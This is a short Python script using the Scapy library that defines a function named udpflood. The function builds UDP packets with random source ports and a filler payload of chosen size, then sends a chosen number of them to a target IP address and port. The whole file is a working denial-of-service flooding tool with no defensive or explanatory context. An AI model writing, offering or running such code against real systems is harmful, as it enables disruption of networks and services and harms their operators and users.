from scapy.all import *


def udpflood(targetip, targetport, number, size):
    ip = IP(dst=targetip)
    udp = UDP(dport=targetport, sport=RandShort())
    data = Raw(b"X" * size)
    packet = ip / udp / data
    send(packet , count=number, verbose=0)
